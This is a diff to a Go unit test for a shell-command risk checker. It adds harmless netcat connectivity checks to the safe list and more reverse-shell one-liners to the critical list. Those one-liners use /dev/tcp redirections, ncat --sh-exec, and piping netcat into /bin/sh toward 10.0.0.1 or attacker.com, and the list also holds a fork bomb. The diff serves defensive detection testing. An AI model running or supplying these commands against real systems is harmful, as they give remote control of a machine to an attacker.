@@ -217,6 +217,10 @@ func TestInspectShellRisk(t *testing.T) {
 		"go test -v ./...",
 		"ls -la sub/dir",
 		"echo 'hello world'",
+		"nc -z test-cluster 80",
+		"nc host-example.org 80",
+		"nc -v app-client 443",
+		"netcat -w 5 dev-env 22",
 	}
 	for _, cmd := range safeCmds {
 		risk := regulator.InspectShellRisk(workDir, cmd)
@@ -236,9 +240,15 @@ func TestInspectShellRisk(t *testing.T) {
 		":(){ :|:& };:",
 		"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
 		"sh -i >& /dev/udp/attacker.com/4444 0>&1",
+		"exec 5<>/dev/tcp/10.0.0.1/8080",
+		"cat < /dev/tcp/10.0.0.1/8080",
+		"0<&196;exec 196<>/dev/tcp/10.0.0.1/8080; sh <&196 >&196 2>&196",
 		"nc -e /bin/sh 10.0.0.1 4444",
 		"ncat -e /bin/bash 192.168.1.5 9001",
 		"netcat 10.0.0.1 4444 -c /bin/bash",
+		"ncat --sh-exec /bin/sh 10.0.0.1 4444",
+		"nc 10.0.0.1 4444 | /bin/sh",
+		"cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
 	}
 	for _, cmd := range criticalCmds {
 		risk := regulator.InspectShellRisk(workDir, cmd)
